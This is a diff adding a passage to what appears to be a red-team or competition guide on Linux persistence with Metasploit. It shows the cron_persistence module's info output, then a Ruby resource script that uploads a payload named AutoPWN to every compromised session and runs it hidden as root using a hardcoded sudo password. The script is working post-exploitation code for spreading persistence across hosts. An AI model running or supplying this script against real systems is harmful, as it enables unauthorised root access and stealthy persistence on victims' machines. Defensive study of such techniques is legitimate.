@@ -250,3 +250,70 @@ Matching Modules
    674  post/linux/manage/sshkey_persistence                                                       excellent  No     SSH Key Persistence
    ```
 
+This will leave us with 8 possible methods for gaining persistence on our targets. We will want to view each of these to see what method to use.  This can be done with the info commands.   
+
+```console
+msf5 > info exploit/linux/local/cron_persistence
+
+       Name: Cron Persistence
+     Module: exploit/linux/local/cron_persistence
+   Platform: Unix, Linux
+       Arch: cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 1979-07-01
+
+Provided by:
+  h00die <mike@shorebreaksecurity.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Cron
+  1   User Crontab
+  2   System Crontab
+
+Check supported:
+  No
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  CLEANUP   true             yes       delete cron entry after execution
+  SESSION                    yes       The session to run this module on.
+  TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
+  USERNAME  root             no        User to run cron/crontab as
+
+Payload information:
+  Avoid: 4 characters
+
+Description:
+  This module will create a cron or crontab entry to execute a 
+  payload. The module includes the ability to automatically clean up 
+  those entries to prevent multiple executions. syslog will get a copy 
+  of the cron entry.
+  ```
+  
+  We decided to use this module during testing.  We found that it worked however it was very easy to notice that there was an adversary on the box and where to find the persistance.  Instead we decided to use a custom exploit based on this module.
+  
+To do that we created a resource file for metasploit that will upload a payload and execute it.
+
+uploadandrun.rc   
+```ruby
+<ruby>
+framework.sessions.each do |num,session|
+print_status("Uploading file to session #{num}")
+session.fs.file.upload_file("/tmp/AutoPWN","AutoPWN")
+print_status("Uploaded, Executing AutoPWN")
+session.sys.process.execute("/bin/bash", "-c 'chmod +x /tmp/AutoPWN && echo \"password!\" | sudo -S bash -c \"/tmp/AutoPWN\"'", {'Hidden' => true, 'Channelized' => false})
+print_status("Successful AutoPWN on session #{num}")
+end
+</ruby>
+```
+
+  
+  
+
+
+
